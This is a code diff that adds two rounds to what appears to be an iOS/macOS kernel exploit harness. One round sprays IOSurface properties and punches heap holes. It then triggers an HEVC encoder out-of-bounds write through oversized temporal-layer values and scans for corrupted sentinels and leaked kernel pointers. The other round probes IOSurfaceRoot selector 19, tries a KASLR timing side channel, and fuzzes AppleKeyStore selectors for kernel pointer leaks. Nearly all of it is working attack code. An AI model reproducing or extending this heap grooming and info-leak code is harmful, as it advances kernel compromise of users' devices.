@@ -30321,6 +30321,512 @@ static void r505_exploit(void) {
     fflush(stdout);
 }
 
+static void r506_exploit(void) {
+    rlog("\n=== r506: NTL OOB + IOSurface property feedback channel ===\n\n");
+    rlog("Strategy: Spray IOSurface properties around AVE's OOB target,\n");
+    rlog("then trigger NTL OOB and check if any property got corrupted.\n\n");
+    fflush(stdout);
+
+    /* Phase 1: Spray IOSurface properties at multiple sizes */
+    rlog("--- Phase 1: Spray sentinel properties ---\n");
+
+    #define R506_SPRAY 256
+    #define R506_PROP_SZ 96
+
+    CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int sv = 32;
+    CFNumberRef sn1 = CFNumberCreate(NULL, kCFNumberIntType, &sv);
+    CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), sn1);
+    CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), sn1);
+    sv = 4; CFNumberRef sn2 = CFNumberCreate(NULL, kCFNumberIntType, &sv);
+    CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerElement"), sn2);
+    sv = 128; CFNumberRef sn3 = CFNumberCreate(NULL, kCFNumberIntType, &sv);
+    CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), sn3);
+    sv = 0x42475241; CFNumberRef sn4 = CFNumberCreate(NULL, kCFNumberIntType, &sv);
+    CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), sn4);
+
+    __block IOSurfaceRef *surfs = calloc(R506_SPRAY, sizeof(IOSurfaceRef));
+    uint8_t sentinel[R506_PROP_SZ];
+
+    for (int i = 0; i < R506_SPRAY; i++) {
+        surfs[i] = IOSurfaceCreate(sp);
+        if (!surfs[i]) continue;
+        memset(sentinel, 0, R506_PROP_SZ);
+        uint32_t magic = 0xBEEF0000 | i;
+        memcpy(sentinel, &magic, 4);
+        uint32_t idx = i;
+        memcpy(sentinel + 4, &idx, 4);
+        memset(sentinel + 8, 0x42, R506_PROP_SZ - 8);
+        CFDataRef d = CFDataCreate(NULL, sentinel, R506_PROP_SZ);
+        IOSurfaceSetValue(surfs[i], CFSTR("_s"), d);
+        CFRelease(d);
+    }
+    rlog("  Sprayed %d surfs x %dB properties\n", R506_SPRAY, R506_PROP_SZ);
+
+    /* Phase 2: Free alternate to make holes for AVE internal alloc */
+    rlog("--- Phase 2: Create holes ---\n");
+    for (int i = 1; i < R506_SPRAY; i += 2) {
+        IOSurfaceRemoveValue(surfs[i], CFSTR("_s"));
+    }
+    rlog("  Freed %d property slots\n", R506_SPRAY / 2);
+    fflush(stdout);
+
+    /* Phase 3: Trigger HEVC NTL OOB at multiple values */
+    rlog("--- Phase 3: NTL OOB trigger ---\n");
+
+    int width = 192, height = 128;
+    NSDictionary *pba = @{
+        (NSString *)kCVPixelBufferWidthKey: @(width),
+        (NSString *)kCVPixelBufferHeightKey: @(height),
+        (NSString *)kCVPixelBufferPixelFormatTypeKey: @(kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange),
+        (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
+    };
+    CVPixelBufferRef pixbuf = NULL;
+    CVReturn cvr = CVPixelBufferCreate(NULL, width, height,
+        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
+        (__bridge CFDictionaryRef)pba, &pixbuf);
+    if (cvr != 0 || !pixbuf) {
+        rlog("  FAILED: CVPixelBufferCreate %d\n", cvr);
+        goto r506_done;
+    }
+
+    CVPixelBufferLockBaseAddress(pixbuf, 0);
+    for (int p = 0; p < 2; p++) {
+        void *base = CVPixelBufferGetBaseAddressOfPlane(pixbuf, p);
+        size_t h2 = CVPixelBufferGetHeightOfPlane(pixbuf, p);
+        size_t bpr = CVPixelBufferGetBytesPerRowOfPlane(pixbuf, p);
+        if (base) memset(base, 0x80, h2 * bpr);
+    }
+    CVPixelBufferUnlockBaseAddress(pixbuf, 0);
+
+    /* Try a range of NTL values near the OOB boundary */
+    int ntl_values[] = {16463, 16464, 16465, 16470, 16500, 17000, 20000, 32000, 50000, 65535};
+    for (int ni = 0; ni < 10; ni++) {
+        int ntl = ntl_values[ni];
+
+        VTCompressionSessionRef sess = NULL;
+        NSDictionary *espec = @{
+            (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES
+        };
+        OSStatus st = VTCompressionSessionCreate(NULL, width, height,
+            kCMVideoCodecType_HEVC,
+            (__bridge CFDictionaryRef)espec, NULL,
+            NULL, NULL, NULL, &sess);
+        if (st != 0 || !sess) {
+            rlog("  NTL=%d: session create failed %d\n", ntl, (int)st);
+            continue;
+        }
+        NSDictionary *ep = @{
+            (NSString *)kVTCompressionPropertyKey_RealTime: @YES,
+            (NSString *)kVTCompressionPropertyKey_ProfileLevel:
+                (NSString *)kVTProfileLevel_HEVC_Main_AutoLevel
+        };
+        VTSessionSetProperties(sess, (__bridge CFDictionaryRef)ep);
+
+        CFNumberRef ntl_n = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
+        st = VTSessionSetProperty(sess, CFSTR("NumberOfTemporalLayers"), ntl_n);
+        CFRelease(ntl_n);
+
+        CMTime pts = CMTimeMake(0, 30);
+        st = VTCompressionSessionEncodeFrame(sess, pixbuf, pts, kCMTimeInvalid,
+            NULL, NULL, NULL);
+        VTCompressionSessionCompleteFrames(sess, kCMTimeInvalid);
+        rlog("  NTL=%d: encode st=%d\n", ntl, (int)st);
+
+        VTCompressionSessionInvalidate(sess);
+        CFRelease(sess);
+
+        /* Quick check after each NTL value */
+        int this_corrupted = 0;
+        for (int i = 0; i < R506_SPRAY; i += 2) {
+            if (!surfs[i]) continue;
+            CFTypeRef val = IOSurfaceCopyValue(surfs[i], CFSTR("_s"));
+            if (!val) continue;
+            if (CFGetTypeID(val) == CFDataGetTypeID()) {
+                CFDataRef dd = (CFDataRef)val;
+                const uint8_t *pp = CFDataGetBytePtr(dd);
+                CFIndex len = CFDataGetLength(dd);
+                if (len >= 4) {
+                    uint32_t m; memcpy(&m, pp, 4);
+                    uint32_t expected = 0xBEEF0000 | i;
+                    if (m != expected) {
+                        this_corrupted++;
+                        rlog("  *** NTL=%d SURF %d CORRUPTED: magic 0x%08x->0x%08x ***\n",
+                             ntl, i, expected, m);
+                        rlog("    First 32 bytes:");
+                        for (int j = 0; j < 32 && j < (int)len; j++)
+                            rlog(" %02x", pp[j]);
+                        rlog("\n");
+                    }
+                }
+                /* Check fill bytes quickly */
+                if (len >= 16 && pp[8] != 0x42) {
+                    this_corrupted++;
+                    rlog("  *** NTL=%d SURF %d FILL CORRUPT at off 8: 0x%02x ***\n",
+                         ntl, i, pp[8]);
+                }
+            } else {
+                this_corrupted++;
+                rlog("  *** NTL=%d SURF %d TYPE CHANGED ***\n", ntl, i);
+            }
+            CFRelease(val);
+        }
+        if (this_corrupted > 0) {
+            rlog("  !!! NTL=%d produced %d corruptions !!!\n", ntl, this_corrupted);
+        }
+    }
+
+    CVPixelBufferRelease(pixbuf);
+
+    /* Phase 4: Final full corruption check */
+    rlog("\n--- Phase 4: Final corruption check ---\n");
+    {
+        int total_corrupt = 0;
+        int total_kptr = 0;
+        for (int i = 0; i < R506_SPRAY; i += 2) {
+            if (!surfs[i]) continue;
+            CFTypeRef val = IOSurfaceCopyValue(surfs[i], CFSTR("_s"));
+            if (!val) continue;
+            if (CFGetTypeID(val) != CFDataGetTypeID()) {
+                total_corrupt++;
+                CFRelease(val); continue;
+            }
+            CFDataRef dd = (CFDataRef)val;
+            const uint8_t *pp = CFDataGetBytePtr(dd);
+            CFIndex len = CFDataGetLength(dd);
+            /* Check for kernel pointers */
+            for (CFIndex j = 0; j + 7 < len; j += 4) {
+                uint64_t v; memcpy(&v, pp + j, 8);
+                if (v != 0x4242424242424242ULL && v != 0 &&
+                    v != 0xFFFFFFFFFFFFFFFFULL &&
+                    v > 0xffff800000000000ULL) {
+                    total_kptr++;
+                    rlog("  *** KPTR surf%d off=%d: 0x%llx ***\n",
+                         i, (int)j, (unsigned long long)v);
+                }
+            }
+            /* Check magic corruption */
+            if (len >= 4) {
+                uint32_t m; memcpy(&m, pp, 4);
+                if (m != (0xBEEF0000U | (uint32_t)i)) total_corrupt++;
+            }
+            CFRelease(val);
+        }
+        rlog("  Total: corrupted=%d kptrs=%d\n", total_corrupt, total_kptr);
+    }
+
+r506_done:
+    for (int i = 0; i < R506_SPRAY; i++)
+        if (surfs[i]) CFRelease(surfs[i]);
+    free(surfs);
+    CFRelease(sp); CFRelease(sn1); CFRelease(sn2);
+    CFRelease(sn3); CFRelease(sn4);
+
+    rlog("\n=== r506 complete ===\n\n");
+    fflush(stdout);
+}
+
+static void r507_exploit(void) {
+    rlog("\n=== r507: Sel19 prereq test + KASLR timing + KeyStore info leak ===\n\n");
+    fflush(stdout);
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    IOObjectRelease(svc);
+    rlog("conn=0x%x\n\n", conn);
+
+    /* Phase 1: Sel 19 BEFORE creating any surface */
+    rlog("--- Phase 1: Sel 19 before surface creation ---\n");
+    {
+        uint32_t v4 = 0x41414141;
+        kr = IOConnectCallMethod(conn, 19, NULL, 0, &v4, 4, NULL, NULL, NULL, NULL);
+        rlog("  sel19(4B, no surface): kr=0x%x%s\n", kr, kr==0 ? " ***OK***" : "");
+        uint64_t sc1[1] = {0};
+        kr = IOConnectCallMethod(conn, 19, sc1, 1, NULL, 0, NULL, NULL, NULL, NULL);
+        rlog("  sel19(1sc, no surface): kr=0x%x%s\n", kr, kr==0 ? " ***OK***" : "");
+    }
+    rlog("\n");
+
+    /* Create a surface */
+    CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int sv = 64;
+    CFNumberRef sn1 = CFNumberCreate(NULL, kCFNumberIntType, &sv);
+    CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), sn1);
+    CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), sn1);
+    sv = 4; CFNumberRef sn2 = CFNumberCreate(NULL, kCFNumberIntType, &sv);
+    CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerElement"), sn2);
+    sv = 256; CFNumberRef sn3 = CFNumberCreate(NULL, kCFNumberIntType, &sv);
+    CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), sn3);
+    sv = 0x42475241; CFNumberRef sn4 = CFNumberCreate(NULL, kCFNumberIntType, &sv);
+    CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), sn4);
+
+    IOSurfaceRef surf = IOSurfaceCreate(sp);
+    uint32_t sid = surf ? IOSurfaceGetID(surf) : 0;
+    rlog("  Created surface id=%u\n\n", sid);
+
+    /* Phase 2: Sel 19 AFTER surface creation */
+    rlog("--- Phase 2: Sel 19 after surface creation ---\n");
+    {
+        uint32_t v4 = 0x41414141;
+        kr = IOConnectCallMethod(conn, 19, NULL, 0, &v4, 4, NULL, NULL, NULL, NULL);
+        rlog("  sel19(4B, after surf): kr=0x%x%s\n", kr, kr==0 ? " ***OK***" : "");
+        for (int sz = 0; sz <= 8; sz++) {
+            uint8_t buf[8] = {0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48};
+            kr = IOConnectCallMethod(conn, 19, NULL, 0, buf, sz, NULL, NULL, NULL, NULL);
+            if (kr == 0) rlog("  sel19(sz=%d): ***OK***\n", sz);
+        }
+        /* Scalar inputs */
+        for (int ns = 0; ns <= 4; ns++) {
+            uint64_t sc[4] = {sid, 0, 0, 0};
+            kr = IOConnectCallMethod(conn, 19, sc, ns, NULL, 0, NULL, NULL, NULL, NULL);
+            if (kr == 0) rlog("  sel19(%dsc,sid): ***OK***\n", ns);
+        }
+        /* Scalar with surface ID + struct */
+        uint64_t sc_sid[1] = {sid};
+        uint32_t v = 0x42424242;
+        kr = IOConnectCallMethod(conn, 19, sc_sid, 1, &v, 4, NULL, NULL, NULL, NULL);
+        rlog("  sel19(1sc=sid, 4B): kr=0x%x%s\n", kr, kr==0 ? " ***OK***" : "");
+    }
+
+    /* Second connection, test sel 19 */
+    rlog("\n  Testing sel 19 on SECOND connection:\n");
+    {
+        io_service_t svc2 = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("IOSurfaceRoot"));
+        io_connect_t conn2 = 0;
+        IOServiceOpen(svc2, mach_task_self(), 0, &conn2);
+        IOObjectRelease(svc2);
+        uint32_t v4 = 0x43434343;
+        kr = IOConnectCallMethod(conn2, 19, NULL, 0, &v4, 4, NULL, NULL, NULL, NULL);
+        rlog("  conn2 sel19(4B): kr=0x%x%s\n", kr, kr==0 ? " ***OK***" : "");
+        IOServiceClose(conn2);
+    }
+    rlog("\n");
+    fflush(stdout);
+
+    /* Phase 3: KASLR timing via mach_absolute_time around IOKit calls */
+    rlog("--- Phase 3: KASLR kernel timing probe ---\n");
+    {
+        /* Method: Time IOConnectCallMethod to different selectors.
+         * The kernel virtual address affects cache line behavior.
+         * We look for timing anomalies that reveal KASLR slide. */
+
+        #define KASLR_ITERS 50000
+        uint64_t times[6];
+        uint32_t dummy = 0;
+
+        /* Time sel 19 (goes into kernel, does something) */
+        uint64_t t0 = mach_absolute_time();
+        for (int i = 0; i < KASLR_ITERS; i++) {
+            uint32_t v = i;
+            IOConnectCallMethod(conn, 19, NULL, 0, &v, 4, NULL, NULL, NULL, NULL);
+        }
+        times[0] = mach_absolute_time() - t0;
+
+        /* Time sel 20 (immediate reject) */
+        t0 = mach_absolute_time();
+        for (int i = 0; i < KASLR_ITERS; i++) {
+            IOConnectCallMethod(conn, 20, NULL, 0, &dummy, 4, NULL, NULL, NULL, NULL);
+        }
+        times[1] = mach_absolute_time() - t0;
+
+        /* Time sel 30 with 1 scalar (different error path) */
+        t0 = mach_absolute_time();
+        for (int i = 0; i < KASLR_ITERS; i++) {
+            uint64_t sc[1] = {(uint64_t)i};
+            IOConnectCallMethod(conn, 30, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
+        }
+        times[2] = mach_absolute_time() - t0;
+
+        /* Time mach_port_allocate/deallocate (kernel primitive) */
+        t0 = mach_absolute_time();
+        for (int i = 0; i < KASLR_ITERS; i++) {
+            mach_port_t p;
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
+            mach_port_deallocate(mach_task_self(), p);
+        }
+        times[3] = mach_absolute_time() - t0;
+
+        /* Time host_statistics64 */
+        t0 = mach_absolute_time();
+        for (int i = 0; i < KASLR_ITERS; i++) {
+            vm_statistics64_data_t vmstats;
+            mach_msg_type_number_t cnt = HOST_VM_INFO64_COUNT;
+            host_statistics64(mach_host_self(), HOST_VM_INFO64,
+                (host_info64_t)&vmstats, &cnt);
+        }
+        times[4] = mach_absolute_time() - t0;
+
+        /* Time task_info */
+        t0 = mach_absolute_time();
+        for (int i = 0; i < KASLR_ITERS; i++) {
+            task_vm_info_data_t ti;
+            mach_msg_type_number_t tic = TASK_VM_INFO_COUNT;
+            task_info(mach_task_self(), TASK_VM_INFO, (task_info_t)&ti, &tic);
+        }
+        times[5] = mach_absolute_time() - t0;
+
+        rlog("  Timing (%d iters each):\n", KASLR_ITERS);
+        rlog("    sel19:          %llu ticks\n", times[0]);
+        rlog("    sel20(fail):    %llu ticks\n", times[1]);
+        rlog("    sel30(1sc):     %llu ticks\n", times[2]);
+        rlog("    port_alloc:     %llu ticks\n", times[3]);
+        rlog("    host_stats64:   %llu ticks\n", times[4]);
+        rlog("    task_info:      %llu ticks\n", times[5]);
+
+        /* Get task_info data to look for addresses */
+        task_vm_info_data_t ti;
+        mach_msg_type_number_t tic = TASK_VM_INFO_COUNT;
+        task_info(mach_task_self(), TASK_VM_INFO, (task_info_t)&ti, &tic);
+        rlog("\n  task_vm_info values:\n");
+        rlog("    virtual_size:   0x%llx\n", (uint64_t)ti.virtual_size);
+        rlog("    resident_size:  0x%llx\n", (uint64_t)ti.resident_size);
+        rlog("    region_count:   %d\n", (int)ti.region_count);
+        rlog("    phys_footprint: 0x%llx\n", (uint64_t)ti.phys_footprint);
+        rlog("    min_address:    0x%llx\n", (uint64_t)ti.min_address);
+        rlog("    max_address:    0x%llx\n", (uint64_t)ti.max_address);
+
+        /* Check for KASLR-related fields in host_info */
+        host_basic_info_data_t hbi;
+        mach_msg_type_number_t hbi_cnt = HOST_BASIC_INFO_COUNT;
+        host_info(mach_host_self(), HOST_BASIC_INFO, (host_info_t)&hbi, &hbi_cnt);
+        rlog("    max_cpus:       %d\n", hbi.max_cpus);
+        rlog("    avail_cpus:     %d\n", hbi.avail_cpus);
+        rlog("    memory_size:    0x%x\n", hbi.memory_size);
+        rlog("    max_mem:        0x%llx\n", (uint64_t)hbi.max_mem);
+    }
+    rlog("\n");
+    fflush(stdout);
+
+    /* Phase 4: AppleKeyStore deep info leak attempt */
+    rlog("--- Phase 4: AppleKeyStore crafted operations ---\n");
+    {
+        io_service_t ks = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("AppleKeyStore"));
+        io_connect_t kc = 0;
+        kr = IOServiceOpen(ks, mach_task_self(), 0, &kc);
+        IOObjectRelease(ks);
+        rlog("  KeyStore conn=0x%x kr=0x%x\n", kc, kr);
+
+        if (kc) {
+            /* Try sel 0 with varied input structs looking for different output */
+            rlog("  Sel 0 with varied input:\n");
+            for (int op = 0; op < 32; op++) {
+                uint8_t in_buf[64] = {0};
+                uint32_t opcode = op;
+                memcpy(in_buf, &opcode, 4);
+                uint8_t out_buf[512] = {0};
+                size_t out_sz = 512;
+                uint64_t osc[4] = {0};
+                uint32_t osc_cnt = 4;
+                kr = IOConnectCallMethod(kc, 0, NULL, 0, in_buf, 64,
+                    osc, &osc_cnt, out_buf, &out_sz);
+                /* Check if output is non-zero */
+                int nonzero = 0;
+                for (size_t j = 0; j < out_sz; j++)
+                    if (out_buf[j] != 0) nonzero++;
+                if (nonzero > 0 || kr != 0) {
+                    rlog("    op=%d: kr=0x%x out_sz=%zu nz=%d", op, kr, out_sz, nonzero);
+                    if (nonzero > 0) {
+                        rlog(" first_nz:");
+                        int shown = 0;
+                        for (size_t j = 0; j < out_sz && shown < 16; j++) {
+                            if (out_buf[j] != 0) {
+                                rlog(" [%zu]=0x%02x", j, out_buf[j]);
+                                shown++;
+                            }
+                        }
+                    }
+                    /* Check output scalars */
+                    for (uint32_t j = 0; j < osc_cnt; j++) {
+                        if (osc[j] != 0) rlog(" osc[%u]=0x%llx", j, osc[j]);
+                    }
+                    rlog("\n");
+                }
+            }
+
+            /* Try sel 1 with varied input */
+            rlog("\n  Sel 1 with varied input:\n");
+            for (int op = 0; op < 32; op++) {
+                uint8_t in_buf[64] = {0};
+                uint32_t opcode = op;
+                memcpy(in_buf, &opcode, 4);
+                uint8_t out_buf[512] = {0};
+                size_t out_sz = 512;
+                kr = IOConnectCallMethod(kc, 1, NULL, 0, in_buf, 64,
+                    NULL, NULL, out_buf, &out_sz);
+                int nonzero = 0;
+                for (size_t j = 0; j < out_sz; j++)
+                    if (out_buf[j] != 0) nonzero++;
+                if (nonzero > 0)
+                    rlog("    op=%d: kr=0x%x out_sz=%zu nz=%d\n", op, kr, out_sz, nonzero);
+            }
+
+            /* Try sel 16 with varied input */
+            rlog("\n  Sel 16 with varied input:\n");
+            for (int op = 0; op < 32; op++) {
+                uint8_t in_buf[64] = {0};
+                uint32_t opcode = op;
+                memcpy(in_buf, &opcode, 4);
+                uint8_t out_buf[512] = {0};
+                size_t out_sz = 512;
+                kr = IOConnectCallMethod(kc, 16, NULL, 0, in_buf, 64,
+                    NULL, NULL, out_buf, &out_sz);
+                int nonzero = 0;
+                for (size_t j = 0; j < out_sz; j++)
+                    if (out_buf[j] != 0) nonzero++;
+                if (nonzero > 0)
+                    rlog("    op=%d: kr=0x%x out_sz=%zu nz=%d\n", op, kr, out_sz, nonzero);
+            }
+
+            /* Wider selector probe: test 0-100 with output buffers */
+            rlog("\n  Wider selector probe (0-100):\n");
+            for (int sel = 0; sel <= 100; sel++) {
+                uint8_t out_buf[512] = {0};
+                size_t out_sz = 512;
+                uint64_t osc[4] = {0};
+                uint32_t osc_cnt = 4;
+                kr = IOConnectCallMethod(kc, sel, NULL, 0, NULL, 0,
+                    osc, &osc_cnt, out_buf, &out_sz);
+                if (kr == 0) {
+                    int nonzero = 0;
+                    for (size_t j = 0; j < out_sz; j++)
+                        if (out_buf[j] != 0) nonzero++;
+                    rlog("    sel%d: OK out_sz=%zu nz=%d", sel, out_sz, nonzero);
+                    /* Check for kernel pointers in output */
+                    for (size_t j = 0; j + 7 < out_sz; j += 8) {
+                        uint64_t v; memcpy(&v, out_buf + j, 8);
+                        if (v > 0xffff800000000000ULL && v != 0xFFFFFFFFFFFFFFFFULL)
+                            rlog(" KPTR@%zu=0x%llx", j, v);
+                    }
+                    for (uint32_t j = 0; j < osc_cnt; j++) {
+                        if (osc[j] > 0xffff800000000000ULL && osc[j] != 0xFFFFFFFFFFFFFFFFULL)
+                            rlog(" osc_KPTR[%u]=0x%llx", j, osc[j]);
+                    }
+                    rlog("\n");
+                }
+            }
+
+            IOServiceClose(kc);
+        }
+    }
+    rlog("\n");
+    fflush(stdout);
+
+    /* Cleanup */
+    if (surf) CFRelease(surf);
+    IOServiceClose(conn);
+    CFRelease(sp); CFRelease(sn1); CFRelease(sn2); CFRelease(sn3); CFRelease(sn4);
+
+    rlog("=== r507 complete ===\n\n");
+    fflush(stdout);
+}
+
 static void r498_exploit(void) {
     rlog("\n=== r498: Bitstream comparison + PropertyMode ===\n\n");
     fflush(stdout);
@@ -101020,6 +101526,18 @@ new_modes:
             r484_exploit();
             goto done;
         }
+        if (rounds == 512) {
+            rlog("*** rounds=512: Sel19 prereq + KASLR timing + KeyStore info ***\n\n");
+            fflush(stdout);
+            r507_exploit();
+            goto done;
+        }
+        if (rounds == 511) {
+            rlog("*** rounds=511: NTL OOB + IOSurface property feedback ***\n\n");
+            fflush(stdout);
+            r506_exploit();
+            goto done;
+        }
         if (rounds == 510) {
             rlog("*** rounds=510: Sel 19 4-byte-only analysis + sel 30 sweep ***\n\n");
             fflush(stdout);
@@ -104083,7 +104601,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 510 && rounds != 509 && rounds != 508 && rounds != 507 && rounds != 506 && rounds != 505 && rounds != 504 && rounds != 503 && rounds != 502 && rounds != 501 && rounds != 500 && rounds != 499 && rounds != 498 && rounds != 497 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 512 && rounds != 511 && rounds != 510 && rounds != 509 && rounds != 508 && rounds != 507 && rounds != 506 && rounds != 505 && rounds != 504 && rounds != 503 && rounds != 502 && rounds != 501 && rounds != 500 && rounds != 499 && rounds != 498 && rounds != 497 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
